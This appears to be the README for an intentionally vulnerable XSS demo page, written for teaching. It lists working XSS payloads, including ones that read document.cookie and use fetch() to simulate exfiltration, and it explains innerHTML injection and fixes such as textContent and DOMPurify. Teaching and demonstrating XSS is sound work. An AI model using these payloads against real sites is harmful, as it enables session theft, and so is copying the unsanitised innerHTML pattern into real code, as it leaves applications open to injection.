# XSS Demo

An intentionally vulnerable search page for demonstrating Cross-Site Scripting (XSS) attacks.

## What it demonstrates

The search page reflects user input directly into the DOM via `innerHTML` with no sanitization. This is one of the most common XSS vulnerabilities in the wild.

## Pages

- `/` — Search form with payload hints
- `/search?query=` — Vulnerable results page

## Payloads to try

| Payload | What happens |
|---|---|
| `<img src=x onerror=alert(1)>` | Fires immediately via broken image |
| `<img src=x onerror=alert(document.cookie)>` | Exposes session cookies |
| `<svg onload=alert(1)>` | Fires on SVG load, no interaction needed |
| `<a href="javascript:alert(1)">click me</a>` | Fires on click |
| `<img src=x onerror="fetch('https://jsonplaceholder.typicode.com/users/1').then(r=>r.json()).then(d=>alert('Exfiltrated: '+d.name+' \| '+d.email))">` | Makes a real HTTP request — simulates data exfiltration |
| `<script>alert(1)</script>` | **Does not work** — browsers block scripts injected via `innerHTML` |

## Why `<script>` tags don't work

This is a deliberate browser protection defined in the HTML spec. Scripts injected via `innerHTML` are parsed into the DOM but never executed. Attackers use event handler attributes (`onerror`, `onload`, `onclick`) or `javascript:` URIs instead.

## How to fix this

Sanitize before touching the DOM:

```js
// Vulnerable
desc.innerHTML = query;

// Safe — renders as text, not HTML
desc.textContent = query;

// Safe — native Sanitizer API (Chrome, limited Firefox, no Safari yet)
const sanitizer = new Sanitizer();
desc.setHTML(query, { sanitizer });

// Safe — DOMPurify, works everywhere
import DOMPurify from 'dompurify';
desc.innerHTML = DOMPurify.sanitize(query);
```

`setHTML()` is the native counterpart to `innerHTML` — it parses and sanitizes in one step. Prefer DOMPurify in production until the Sanitizer API has broader support.

## Disclaimer

This project is for educational purposes only. Do not deploy it publicly.
